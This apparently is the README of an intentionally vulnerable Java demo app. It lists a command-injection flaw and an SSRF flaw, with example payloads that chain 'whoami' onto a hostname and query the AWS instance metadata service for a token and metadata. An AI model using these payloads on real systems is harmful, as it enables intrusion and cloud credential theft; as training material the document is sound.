Vulnerable Java App
=======================

# Vulnerable Java

Like many poorly built apps, this one contains two serious vulnerabilities:

**Code execution:**
Example exploitation- 
```google.com && whoami```


**SSRF exploit:**
Example exploitation- 
```google.com && TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/ > output && cat output```



**Note to self**
Some specific syntax is needed to start a long running process with code deploy:
```#!/bin/bash
/tmp/sleep.sh > /dev/null 2> /dev/null < /dev/null &```
